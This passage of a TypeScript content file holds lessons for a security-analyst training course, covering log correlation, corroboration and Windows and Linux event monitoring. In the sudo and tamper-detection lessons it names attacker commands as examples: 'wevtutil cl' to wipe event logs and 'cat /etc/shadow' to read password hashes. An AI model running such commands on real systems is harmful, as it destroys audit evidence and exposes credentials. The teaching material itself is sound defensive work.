    // 4. M06-U2-C2: Compare related records across sources
    if (chId === 'M06-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: STABLE IDENTIFIERS',
          subPillar: 'HARDWARE VS TRANSIENT IP',
          heading: 'Stable Hardware MAC/SID vs Transient IP Correlation',
          paragraph1:
            'When tracking an attacker across branch logs, IP address 10.10.20.15 appears in firewall denies, proxy traffic, and authentication requests.',
          paragraph2:
            'Mentor Karthik cautions: "IP addresses are transient leases. Anchor your investigation to stable identifiers: physical MAC addresses, Active Directory Security SIDs, and endpoint HostGUIDs."',
          techBoxTitle: 'TECH BOX: Stable Identifiers vs Ephemeral IP Leases [Details]',
          techBoxAnalogy:
            'Identifying a citizen by their permanent biometric citizen ID number (SID/MAC) rather than the hotel room number (IP) they checked into for a single night.',
          techBoxDef:
            'Stable Identifiers are immutable or persistent entity attributes (MAC, Active Directory SID, EDR Agent UUID) that outlive dynamic network address reassignments.',
          techBoxWhy:
            'Correlating solely by IP address across days attributes malicious activity to innocent employees who received the recycled IP address after lunch.',
          defaultAnimation: 'm06-stable-identifiers' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'id-mac-hardware', label: 'HARDWARE MAC' },
            { id: 'id-sid-security', label: 'SECURITY SID' },
            { id: 'id-ip-transient', label: 'TRANSIENT IP ⚠️' },
            { id: 'id-pivot-anchor', label: 'CORRELATION ANCHOR' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DHCP LEASE WINDOW',
          subPillar: 'DYNAMIC REASSIGNMENT',
          heading: 'DHCP Lease Windows & Dynamic Host Reassignment',
          paragraph1:
            'Workstation BLR-BR-WS-04 held IP 10.10.20.15 under an 8-hour DHCP lease expiring at 12:00 UTC. At 12:15 UTC, an external auditor laptop plugged into the branch switch received that exact IP.',
          paragraph2:
            'By checking DHCP ACK audit logs, the apprentice discovers the IP reassignment: "Activity before 12:00 belongs to Ramesh; activity after 12:15 belongs to the auditor laptop."',
          techBoxTitle: 'TECH BOX: DHCP Lease Window Scoping & Mac Correlation [Details]',
          techBoxAnalogy:
            'A rental car rented by Driver A in the morning and Driver B in the afternoon: traffic tickets issued at 3:00 PM must be charged to Driver B, not Driver A.',
          techBoxDef:
            'DHCP Lease Window Scoping bounds IP-based evidence strictly within the validated lease start and expiration timestamps for a specific MAC address.',
          techBoxWhy:
            'Prevents wrongful accusations and ensures incident responders investigate the correct physical workstation.',
          defaultAnimation: 'm06-dhcp-lease-window' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'lease-active-window', label: 'ACTIVE LEASE (08-12)' },
            { id: 'lease-reassigned', label: 'REASSIGNED (12:15+)' },
            { id: 'lease-mac-compare', label: 'MAC DIVERGENCE' },
            { id: 'lease-dhcp-audit', label: 'DHCP AUDIT PROOF' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: COINCIDENCE TRIAGE',
          subPillar: 'TEMPORAL CORROBORATION',
          heading: 'Temporal Coincidence vs Corroborated Connection',
          paragraph1:
            'At 02:45:10Z, BLR-BR-WS-04 emitted a failed logon. At 02:45:12Z, an external firewall blocked an inbound port sweep from Russia.',
          paragraph2:
            'Mentor Karthik challenges the apprentice: "Did the Russian IP cause the failed logon?" The apprentice inspects source sockets: the logon was local console; the two events are a temporal coincidence, not a causal connection.',
          techBoxTitle: 'TECH BOX: Temporal Proximity vs Causal Connection [Details]',
          techBoxAnalogy:
            'A thunderclap sounding outside at the exact second a lightbulb burns out in your kitchen. Coincidental timing does not prove the lightning struck your ceiling fixture.',
          techBoxDef:
            'Coincidence Triage tests temporal correlations against socket endpoints, process trees, and user contexts to differentiate random proximity from causal intrusion chains.',
          techBoxWhy:
            'Saves hours of fruitless investigation pursuing attacker phantom leads that have zero technical linkage to the internal incident.',
          defaultAnimation: 'm06-coincidence-triage' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'coin-same-minute', label: 'COINCIDENCE (02:45)' },
            { id: 'coin-source-check', label: 'SOCKET DISCONNECT' },
            { id: 'coin-divergent-path', label: 'INDEPENDENT PATHS' },
            { id: 'coin-causal-rule', label: 'CORROBORATION RULE' },
          ],
        },
      ];
    }

    // 5. M06-U3-C1: Corroboration, gaps and uncertainty
    if (chId === 'M06-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CORROBORATION',
          subPillar: 'MULTI-SOURCE MATRIX',
          heading: 'Multi-Source Corroboration Matrix & NetFlow Triangulation',
          paragraph1:
            'A high-severity EDR alert claims PowerShell downloaded an encoded payload on BLR-BR-WS-04. The apprentice triangulates: proxy access logs, firewall state tables, and core switch NetFlow.',
          paragraph2:
            'Proxy logs show zero outbound HTTP requests, but NetFlow records an uninspected direct IP connection on port 443. The hypothesis of outbound C2 is corroborated by wire evidence.',
          techBoxTitle: 'TECH BOX: Corroboration Matrix & Independent Wire Taps [Details]',
          techBoxAnalogy:
            'A criminal trial requiring eyewitness testimony, security camera footage, and bank transaction records that independently verify each other.',
          techBoxDef:
            'Corroboration Matrix evaluates alerts across independent sensor layers (Host EDR, Wire NetFlow, Perimeter Firewall) to establish forensic certainty.',
          techBoxWhy:
            'Endpoint agents can be blinded or bypassed by rootkits; independent wire taps provide unalterable ground truth.',
          defaultAnimation: 'm06-corroboration-engine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cor-corroborated', label: 'CORROBORATED (EDR+NET)' },
            { id: 'cor-contradicted', label: 'CONTRADICTED (PROXY)' },
            { id: 'cor-unresolved', label: 'UNRESOLVED GAP' },
            { id: 'cor-netflow-tap', label: 'WIRE TAP EVIDENCE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: BLACKOUT GAP',
          subPillar: 'LOGGING HOLE RECONSTRUCTION',
          heading: 'The 30-Minute Endpoint Blackout Gap & Triangulation',
          paragraph1:
            'Between 02:15Z and 02:45Z, workstation BLR-BR-WS-04 recorded zero Windows security events. Did the attacker disable event logging, or was the machine powered off?',
          paragraph2:
            'The apprentice checks perimeter NetFlow and DHCP heartbeats: the workstation was actively transmitting packets throughout the 30-minute silence. The logging service was suppressed.',
          techBoxTitle: 'TECH BOX: Telemetry Blackouts & Tamper Detection [Details]',
          techBoxAnalogy:
            'A bank security guard’s radio falling silent for 30 minutes while building perimeter motion sensors show active foot traffic inside the lobby.',
          techBoxDef:
            'Blackout Gap Triangulation detects host log suppression by comparing absent endpoint telemetry against active network wire flows during the same time window.',
          techBoxWhy:
            'Adversaries routinely execute "wevtutil cl" to cover their tracks; network wire triangulation exposes the deliberate tampering.',
          defaultAnimation: 'm06-blackout-gap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'blk-evidence-hole', label: '30-MIN SILENCE ⚠️' },
            { id: 'blk-wire-heartbeat', label: 'ACTIVE WIRE FLOWS' },
            { id: 'blk-tamper-verdict', label: 'TAMPER VERDICT' },
            { id: 'blk-reconstruction', label: 'GAP BOUNDARY' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ECHO CHAMBER',
          subPillar: 'SINGLE-SOURCE CIRCULARITY',
          heading: 'The Echo Chamber Trap: Single Source Circularity',
          paragraph1:
            'The apprentice presents three pieces of evidence: an EDR alert, an antivirus report, and a SIEM summary ticket. Mentor Karthik notes: "All three originated from the same agent on the endpoint."',
          paragraph2:
            'Three alerts spawned by a single host sensor do not represent three corroborating sources. True corroboration requires independent verification from network sensors, identity providers, or remote servers.',
          techBoxTitle: 'TECH BOX: Echo Chamber Trap & Sensor Circularity [Details]',
          techBoxAnalogy:
            'Three newspapers repeating the exact same unverified rumor from a single anonymous blogger. Three headlines do not equal three eyewitnesses.',
          techBoxDef:
            'The Echo Chamber Trap occurs when an analyst mistakes multiple downstream alerts derived from one sensor for independent multi-source corroboration.',
          techBoxWhy:
            'Prevents confirmation bias and false confidence when an endpoint agent hallucinates or triggers on a benign software installer.',
          defaultAnimation: 'm06-echo-chamber' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'echo-single-source', label: 'SINGLE SENSOR' },
            { id: 'echo-downstream-dups', label: '3 FORWARDED ALERTS' },
            { id: 'echo-circular-trap', label: 'CIRCULAR TRAP ⚠️' },
            { id: 'echo-true-independent', label: 'INDEPENDENT TAP ✓' },
          ],
        },
      ];
    }

    // 6. M06-U3-C2: Observed fact versus analyst inference
    if (chId === 'M06-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TWO-COLUMN LEDGER',
          subPillar: 'FACT VS HYPOTHESIS',
          heading: 'Two-Column Ledger: Observed Facts vs Testable Hypotheses',
          paragraph1:
            'Mentor Karthik introduces the forensic golden rule: create a strict two-column ledger. Column A lists verified physical facts; Column B lists testable hypotheses.',
          paragraph2:
            'Fact: "BLR-BR-WS-04 sent 4.2 MB to 198.51.100.22 at 02:45Z." Hypothesis: "Data exfiltration via encrypted tunnel." The hypothesis is actionable only because it can be verified or falsified.',
          techBoxTitle: 'TECH BOX: Two-Column Forensic Ledger & Karl Popper Falsification [Details]',
          techBoxAnalogy:
            'A scientific lab notebook: Column A records thermometer readings and test tube colors; Column B records chemical reaction hypotheses.',
          techBoxDef:
            'Two-Column Ledger enforces a strict boundary between immutable physical log observables and tentative analytical interpretations.',
          techBoxWhy:
            'Keeps investigations grounded in physical evidence and prevents misleading corporate leadership with speculation presented as fact.',
          defaultAnimation: 'm06-two-column-ledger' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ledg-observed-fact', label: 'COLUMN A: FACTS' },
            { id: 'ledg-hypothesis', label: 'COLUMN B: HYPOTHESIS' },
            { id: 'ledg-test-criteria', label: 'FALSIFICATION TEST' },
            { id: 'ledg-discipline-rule', label: 'KARTHIK DOCTRINE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PRESUMPTION TRAP',
          subPillar: 'SEQUENCE TRAP',
          heading: 'The Premature Presumption Trap: 3 Fails + 1 Success',
          paragraph1:
            'A user account logs three failed attempts followed by one successful authentication at 02:46Z. The apprentice concludes: "The attacker brute-forced the employee password."',
          paragraph2:
            'Mentor Karthik steps in: "Did the user forget their password, or did an adversary guess it? Describe the physical sequence in Column A, then test employee presence before declaring a breach."',
          techBoxTitle: 'TECH BOX: Sequence Traps & Human Presence Verification [Details]',
          techBoxAnalogy:
            'Typing your online banking password twice with Caps Lock on, realizing the mistake, and typing it correctly on the third try. An automated alert sees "brute force", but the human reality is benign.',
          techBoxDef:
            'The Presumption Trap occurs when an analyst assumes an adversarial narrative for an ambiguous sequence without seeking corroborating operational context.',
          techBoxWhy:
            'Calling an employee or checking badge swipe logs clarifies ambiguous authentication sequences in minutes without triggering costly incident panic.',
          defaultAnimation: 'm06-presumption-trap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'pres-fail-sequence', label: '3 FAILS + 1 SUCCESS' },
            { id: 'pres-capslock-benign', label: 'BENIGN EXPLANATION' },
            { id: 'pres-user-outreach', label: 'VERIFY PRESENCE' },
            { id: 'pres-evidence-gate', label: 'EVIDENCE GATE ✓' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: UNCERTAINTY NOTE',
          subPillar: 'SUPERVISORY HANDOVER',
          heading: 'The Actionable Uncertainty Note & Traceable Dossier',
          paragraph1:
            'A vague note states: "Activity is suspicious and unverified." An actionable note states: "Physical presence at desk 04 at 02:45Z is unconfirmed; requesting branch turnstile badge logs."',
          paragraph2:
            'Mentor Karthik and Shift Lead Ananya sign off on Case #2026-881: "Our finance timeline is now traceable and appropriately qualified." The apprentice completes Module 06 with high forensic discipline.',
          techBoxTitle: 'TECH BOX: Actionable Uncertainty Notes & Supervisory Sign-Off [Details]',
          techBoxAnalogy:
            'A doctor writing a patient referral note: stating clearly that blood pressure is elevated, but explicitly noting that a cardiogram is needed to confirm the diagnosis.',
          techBoxDef:
            'An Actionable Uncertainty Note explicitly defines what is unknown, bounds the scope of doubt, and prescribes the specific evidence artifact needed to resolve it.',
          techBoxWhy:
            'Enables the incoming shift analyst to immediately execute the next investigation step without restarting triage from scratch.',
          defaultAnimation: 'm06-uncertainty-note' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'note-precise-unknown', label: 'PRECISE UNKNOWN' },
            { id: 'note-test-recipe', label: 'ACTIONABLE RECIPE' },
            { id: 'note-supervisory-handover', label: 'TRACEABLE DOSSIER' },
            { id: 'note-dossier-signed', label: 'SIGNED & SEALED ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 07: WINDOWS & LINUX SECURITY MONITORING (Mentor Ravi) — 6 Chapters (18 Bespoke Pillars)
    // =========================================================================

    // 1. M07-U1-C1: Windows event log basics
    if (chId === 'M07-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: CHANNELS & PROVIDERS',
          subPillar: 'EVENT LOG ARCHITECTURE',
          heading: 'Windows Log Channels & Provider Architecture',
          paragraph1:
            'Mentor Ravi guides the apprentice back to host BLR-BR-WS-04: "Windows does not write everything into one big file. It divides telemetry across specialized channels: Security, System, and Application."',
          paragraph2:
            'Security.evtx requires elevated privileges and stores authentication audits; System.evtx records kernel and service events; Application.evtx captures user software crashes and database faults.',
          techBoxTitle: 'TECH BOX: Windows Event Log Architecture & Channels [Details]',
          techBoxAnalogy:
            'A corporate office building with three separate logbooks: security guards log visitors at the front door (Security), facility engineers log elevator maintenance (System), and departmental staff report broken printers (Application).',
          techBoxDef:
            'Windows Event Log Architecture partitions events into discrete binary .evtx files governed by publishing providers with cryptographic tamper-resistance and strict ACLs.',
          techBoxWhy:
            'Ensures analysts search the correct log channel during an investigation: looking for a rogue service installation in Security.evtx yields zero results because services log to System.evtx.',
          defaultAnimation: 'm07-channel-providers' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'chan-security-evtx', label: 'SECURITY.EVTX' },
            { id: 'chan-system-evtx', label: 'SYSTEM.EVTX' },
            { id: 'chan-app-evtx', label: 'APPLICATION.EVTX' },
            { id: 'chan-provider-anchor', label: 'PROVIDER ANCHOR' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: SIGNPOST DOCTRINE',
          subPillar: 'EVENT ID CONTEXT',
          heading: 'The Event ID Signpost Doctrine: Numbers Direct, Context Explains',
          paragraph1:
            'When the apprentice notices Event 4625, Mentor Ravi cautions: "Can an event number alone tell the whole story? No. Event identifiers are signposts, not complete explanations."',
          paragraph2:
            'An Event ID points you to the category of activity, but true investigation requires the participating account, workstation name, caller process, timestamp, and the exact SubStatus failure code.',
          techBoxTitle: 'TECH BOX: The Signpost Principle & SubStatus Codes [Details]',
          techBoxAnalogy:
            'A road sign that reads "REST AREA": it tells you what category of facility is ahead, but not whether fuel is available, whether the gate is open, or which cars are parked inside.',
          techBoxDef:
            'The Signpost Doctrine asserts that Event IDs categorize system operations, but full operational meaning requires parsing associated parameter fields and status codes.',
          techBoxWhy:
            'Prevents shallow alert triage: SubStatus 0xC000006A reveals a mistyped password, while 0xC0000234 proves an account lockout from a sustained brute-force sweep.',
          defaultAnimation: 'm07-eventid-signposts' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sign-naked-id', label: 'NAKED ID 4625' },
            { id: 'sign-full-hud', label: 'FULL CONTEXT HUD' },
            { id: 'sign-substatus-code', label: 'SUBSTATUS 0xC000006A' },
            { id: 'sign-ravi-doctrine', label: 'SIGNPOST DOCTRINE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: PROVIDER INTEGRITY',
          subPillar: 'HOMOGRAPH TRAP AVOIDANCE',
          heading: 'Provider Integrity & The Homograph Number Collision Trap',
          paragraph1:
            'Mentor Ravi shows two records both labeled Event 104. In System.evtx, Event 104 from Microsoft-Windows-Eventlog represents an adversary clearing the audit log to cover tracks.',
          paragraph2:
            'In PrintService/Operational.evtx, Event 104 merely records an employee printing an expense report. Treating them as identical because the numbers match is a catastrophic triage mistake.',
          techBoxTitle: 'TECH BOX: Provider Scoping & Event ID Collisions [Details]',
          techBoxAnalogy:
            'Flight 104 on Delta versus Room 104 at the Marriott: identical identification numbers representing completely different real-world entities in different domains.',
          techBoxDef:
            'Provider Scoping dictates that Windows Event IDs are unique only within the namespace of their publishing provider string, not globally across the operating system.',
          techBoxWhy:
            'Protects the SOC from creating false emergency incident tickets over routine printer jobs or benign application diagnostics.',
          defaultAnimation: 'm07-provider-integrity' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'integ-sys-104', label: 'EVENTLOG 104 🚨' },
            { id: 'integ-print-104', label: 'PRINTSERVICE 104 📄' },
            { id: 'integ-collision-trap', label: 'COLLISION TRAP' },
            { id: 'integ-provider-check', label: 'PROVIDER CHECK ✓' },
          ],
        },
      ];
    }

    // 2. M07-U1-C2: Logon and account activity
    if (chId === 'M07-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: LOGON TYPE MATRIX',
          subPillar: 'ATTACK SURFACE TRIAGE',
          heading: 'The Logon Type Matrix: Interactive, Network & RDP Vectors',
          paragraph1:
            'Event 4624 records successful authentication, but the LogonType parameter reveals how the connection was made: Type 2 (Console), Type 3 (Network), or Type 10 (RemoteInteractive).',
          paragraph2:
            'Type 2 requires someone sitting at the physical keyboard; Type 3 indicates lateral network access over SMB/RPC; Type 10 represents remote desktop control over RDP port 3389.',
          techBoxTitle: 'TECH BOX: Logon Types & Physical vs Remote Surfaces [Details]',
          techBoxAnalogy:
            'A key opening your front door: Type 2 is turning the physical brass key in the lock; Type 3 is receiving a package through the mail slot; Type 10 is controlling a remote telepresence robot inside the foyer.',
          techBoxDef:
            'Windows Logon Types specify the logon mechanism (Interactive, Network, Batch, Service, RemoteInteractive) in Security Event IDs 4624 and 4625.',
          techBoxWhy:
            'Allows analysts to immediately establish the attack vector: a remote attacker using stolen credentials over RDP generates Type 10, not local Type 2.',
          defaultAnimation: 'm07-logon-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'logon-type-2', label: 'TYPE 2 CONSOLE' },
            { id: 'logon-type-3', label: 'TYPE 3 NETWORK' },
            { id: 'logon-type-10', label: 'TYPE 10 RDP' },
            { id: 'logon-context-audit', label: 'VECTOR AUDIT' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PRIVILEGED CONTEXT',
          subPillar: 'EVENT 4672 EVALUATION',
          heading: 'Event 4672 Privileged Activity Context: Rights != Escalation',
          paragraph1:
            'Event 4672 records special administrative privileges assigned to a new logon session, including SeDebugPrivilege, SeBackupPrivilege, and SeSecurityPrivilege.',
          paragraph2:
            'Mentor Ravi asks: "Does 4672 prove an attacker escalated privileges? No. It occurs during legitimate admin logons; investigate the account and associated activity."',
          techBoxTitle: 'TECH BOX: Administrative Privilege Assignment & Context [Details]',
          techBoxAnalogy:
            'A master key ring handed to a security guard at the start of a night shift. Handing over the key ring (4672) is normal procedure; using it to unlock the CEO’s private safe at 2:45 AM is an incident.',
          techBoxDef:
            'Event 4672 (Special Privileges Assigned) enumerates user rights allocated by the Local Security Authority during token creation for administrative accounts.',
          techBoxWhy:
            'Prevents false alarms on scheduled maintenance scripts while focusing detection on standard user accounts that unexpectedly receive administrator rights.',
          defaultAnimation: 'm07-privilege-context' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'priv-4672-event', label: 'EVENT 4672' },
            { id: 'priv-assigned-rights', label: 'ASSIGNED RIGHTS' },
            { id: 'priv-benign-admin', label: 'BENIGN BACKUP ✓' },
            { id: 'priv-suspect-finance', label: 'SUSPECT CASE 🔍' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: IDENTITY DOCTRINE',
          subPillar: 'ACCOUNT != PERSON',
          heading: 'The Account Owner vs Person Identity Doctrine',
          paragraph1:
            'When examining a successful logon for ramesh at 02:45 AM, Mentor Ravi challenges: "Does a successful logon prove the legitimate account owner was responsible?"',
          paragraph2:
            'The apprentice answers correctly: "No. It proves the recorded authentication outcome, not the person\'s identity." Ramesh was asleep at home while his stolen credentials were used remotely.',
          techBoxTitle: 'TECH BOX: Digital Credentials vs Physical Human Identity [Details]',
          techBoxAnalogy:
            'A hotel keycard tapped to open Room 304: the electronic lock confirms a valid keycard was presented, but cannot prove whether the registered guest or a thief swiped it.',
          techBoxDef:
            'The Identity Doctrine maintains a strict distinction between successful credential authentication (digital observable) and the physical presence or agency of the biological user.',
          techBoxWhy:
            'Preserves forensic integrity, prevents premature accusatory conclusions against innocent staff, and directs investigators to uncover credential theft.',
          defaultAnimation: 'm07-identity-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ident-cred-success', label: 'AUTH OUTCOME' },
            { id: 'ident-empty-chair', label: 'EMPTY CHAIR' },
            { id: 'ident-presence-verify', label: 'BADGE VERIFY' },
            { id: 'ident-ravi-rule', label: 'RAVI RULE ✓' },
          ],
        },
      ];
    }

    // 3. M07-U2-C1: Authentication and system logs
    if (chId === 'M07-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: LOG GEOGRAPHY',
          subPillar: 'LINUX PATH MAPPING',
          heading: 'Linux Distribution Log Geography: Distro Path Mapping',
          paragraph1:
            'Switching to Linux server BLR-PROD-SRV01, Mentor Ravi explains: "Linux logging differs by distribution and configuration; authentication records may appear in files or the journal."',
          paragraph2:
            'Debian and Ubuntu write PAM records to /var/log/auth.log; RHEL, CentOS, and Fedora use /var/log/secure; modern systemd servers use journalctl -u ssh for structured binary logs.',
          techBoxTitle: 'TECH BOX: Linux Log File Locations & /etc/os-release [Details]',
          techBoxAnalogy:
            'Driving in the UK versus the US: the steering wheel and lane rules switch sides, but you are still navigating the same physical vehicle on the road.',
          techBoxDef:
            'Linux Log Geography maps authentication and authorization logging files across Debian-family, Red Hat-family, and systemd-journald implementations.',
          techBoxWhy:
            'Prevents analyst confusion: searching for /var/log/auth.log on a Red Hat server returns a "file not found" error that could be mistaken for zero activity.',
          defaultAnimation: 'm07-linux-log-geography' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'geo-auth-log', label: 'UBUNTU AUTH.LOG' },
            { id: 'geo-secure-log', label: 'RHEL SECURE' },
            { id: 'geo-systemd-journal', label: 'SYSTEMD JOURNAL' },
            { id: 'geo-distro-guide', label: 'DISTRO GUIDE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: SSH STREAM TRIAGE',
          subPillar: 'SOCKET & OUTCOME PARSING',
          heading: 'SSH Authentication Stream & Socket Dissection',
          paragraph1:
            'Linux SSH daemon records provide rich telemetry: timestamp, daemon PID, auth method (password vs publickey), remote IP, remote ephemeral port, and user identity.',
          paragraph2:
            'Mentor Ravi emphasizes socket bindings: "The remote port (e.g. 51220) and IP link the Linux log line directly to stateful perimeter firewall logs and wire NetFlow."',
          techBoxTitle: 'TECH BOX: SSH Audit Formatting & Socket Linkage [Details]',
          techBoxAnalogy:
            'A postal customs declaration attached to a parcel: listing sender address, port of departure, inspection stamp, and recipient locker.',
          techBoxDef:
            'SSH Authentication Logging records connection attempts handled by sshd, identifying key fingerprints, authentication outcome, and network socket pairs.',
          techBoxWhy:
            'Enables rapid cross-source corroboration between Linux endpoint auth events and enterprise network flow records.',
          defaultAnimation: 'm07-ssh-stream-triage' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ssh-failed-pw', label: 'FAILED PASSWORD' },
            { id: 'ssh-accepted-key', label: 'ACCEPTED KEY' },
            { id: 'ssh-source-socket', label: 'SOCKET BINDING' },
            { id: 'ssh-stream-filter', label: 'CROSS-PLATFORM' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: BRUTE FORCE TRIAGE',
          subPillar: 'PIVOT SEARCH DOCTRINE',
          heading: 'The SSH Brute-Force Triage & Pivot Doctrine',
          paragraph1:
            'Mentor Ravi challenges: "Do several SSH failures alone prove successful access? No. I would need evidence of success or subsequent activity."',
          paragraph2:
            'Internet servers experience thousands of automated dictionary attempts daily. The critical investigative requirement is running a scoped query for "Accepted" within the failure window.',
          techBoxTitle: 'TECH BOX: Brute-Force Volume vs Successful Breach [Details]',
          techBoxAnalogy:
            'A locked vault door being kicked 4,000 times by a crowd of thieves. The kicks make noise, but the vault remains secure until someone turns the dial with the correct combination.',
          techBoxDef:
            'The Brute-Force Pivot Doctrine demands validating whether an authentication failure burst concluded with an "Accepted" record or subsequent elevated command execution.',
          techBoxWhy:
            'Differentiates benign automated internet background noise from a critical initial access compromise.',
          defaultAnimation: 'm07-ssh-brute-force-doctrine' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'brute-fail-volume', label: 'BURST: 4,200 FAILS' },
            { id: 'brute-barrier-held', label: 'BARRIER HELD ✓' },
            { id: 'brute-accepted-pivot', label: 'ACCEPTED PIVOT 🚨' },
            { id: 'brute-discipline-rule', label: 'RAVI RULE' },
          ],
        },
      ];
    }

    // 4. M07-U2-C2: Users, services and sudo activity
    if (chId === 'M07-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SYSTEMD SERVICES',
          subPillar: 'DAEMON ARCHITECTURE',
          heading: 'Linux Service Architecture & Systemd Daemons',
          paragraph1:
            'Services support background applications on Linux. Master process systemd (PID 1) manages daemons defined by unit files in /etc/systemd/system/.',
          paragraph2:
            'Legitimate daemons run under unprivileged service accounts like www-data. Adversaries install custom systemd units running out of /tmp to establish persistent backdoors.',
          techBoxTitle: 'TECH BOX: Systemd Service Units & Persistence Vectors [Details]',
          techBoxAnalogy:
            'The utility basement of an apartment building: furnaces and water pumps running continuously under maintenance worker oversight. An unauthorized tap plugged into the main fuse box is a rogue intrusion.',
          techBoxDef:
            'Systemd Unit Files define daemon startup parameters, restart policies, and executable binary paths (ExecStart) for background services.',
          techBoxWhy:
            'Systemd persistence (MITRE ATT&CK T1543.002) is a primary technique used by Linux malware to survive reboots.',
          defaultAnimation: 'm07-systemd-services' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'srv-systemd-pid1', label: 'SYSTEMD PID 1' },
            { id: 'srv-daemon-worker', label: 'APPROVED DAEMON' },
            { id: 'srv-unit-status', label: 'UNIT STATUS' },
            { id: 'srv-unapproved-unit', label: 'ROGUE UNIT 🚨' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: SUDO AUDIT TRAIL',
          subPillar: 'ELEVATED COMMAND TRIAGE',
          heading: 'Sudo Audit Trail Dissection & Change Controls',
          paragraph1:
            'Sudo allows authorized users to execute commands under another identity (usually root). Every invocation writes caller identity, terminal TTY, target account, and the executed binary to auth.log.',
          paragraph2:
            'Mentor Ravi notes: "Does every use of sudo mean an incident? No. Check who used it, which command was recorded, when, and whether it matches approved work."',
          techBoxTitle: 'TECH BOX: Sudo Logging Syntax & Change Management [Details]',
          techBoxAnalogy:
            'A bank clerk opening the safety deposit vault: signing their name, time of entry, and customer box number in the dual-custody physical ledger.',
          techBoxDef:
            'Sudo Audit Records capture delegated administrative commands, logging caller, target, working directory, and binary invocation parameters.',
          techBoxWhy:
            'Distinguishes routine administrative patching (apt update) from malicious credential theft (cat /etc/shadow).',
          defaultAnimation: 'm07-sudo-audit-trail' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sudo-caller-user', label: 'CALLER IDENTITY' },
            { id: 'sudo-target-root', label: 'TARGET ROOT' },
            { id: 'sudo-command-binary', label: 'EXECUTED BINARY' },
            { id: 'sudo-change-ticket', label: 'CHANGE TICKET' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: VISIBILITY BOUNDARY',
          subPillar: 'KERNEL AUDITD VS SHELL',
          heading: 'Command Auditing Visibility & Kernel Auditd',
          paragraph1:
            'Mentor Ravi cautions: "Can we assume complete command auditing exists on every host? No. Bash history can be unset or deleted; kernel auditd is required for reliable proof."',
          paragraph2:
            'Ravi\'s doctrine: "Missing detail is a limitation to record, not a reason to fabricate a command history. Professional analysts document what is known and what cannot be seen."',
          techBoxTitle: 'TECH BOX: Linux Audit Subsystem (auditd) vs Bash History [Details]',
          techBoxAnalogy:
            'A driver’s personal diary of where they drove (bash history) versus the tollway camera tracking every license plate through the gate (kernel auditd).',
          techBoxDef:
            'Linux Audit Subsystem (auditd) captures system calls (execve) directly from the kernel, guaranteeing unalterable command logging independent of shell environment settings.',
          techBoxWhy:
            'Eliminates blind spots and ensures analysts acknowledge when lack of command telemetry is an architectural limitation.',
          defaultAnimation: 'm07-command-visibility-boundary' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'vis-default-shell-gap', label: 'BASH HISTORY GAP' },
            { id: 'vis-auditd-syscalls', label: 'KERNEL AUDITD' },
            { id: 'vis-history-tamper', label: 'TAMPER DETECT' },
            { id: 'vis-record-limitation', label: 'HONEST LIMIT' },
          ],
        },
      ];
    }

    // 5. M07-U3-C1: Baseline and unusual activity
    if (chId === 'M07-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: WORKSTATION BASELINE',
          subPillar: 'BEHAVIORAL NORMAL',
          heading: 'Workstation Baseline Behavioral Profile HUD',
          paragraph1:
            'A baseline describes typical or approved activity on branch workstation BLR-BR-WS-04: typical operating hours (09:00 - 18:00 IST), expected finance apps, and IT service accounts.',
          paragraph2:
            'Mentor Ravi teaches: "Deviations help direct attention but are not automatically attacks. A late-working employee is normal; an unapproved LOLBin execution requires triage."',
          techBoxTitle: 'TECH BOX: Host Behavioral Baselines & Operational Norms [Details]',
          techBoxAnalogy:
            'A doctor knowing a patient’s resting heart rate: 70 bpm is normal; a spike to 130 bpm directs attention to check if they were running up stairs or experiencing an arrhythmia.',
          techBoxDef:
            'Host Baselines quantify expected temporal, process, and identity behaviors to identify statistical and contextual anomalies.',
          techBoxWhy:
            'Prevents false alarms on legitimate business operations while rapidly surfacing abnormal overnight activity.',
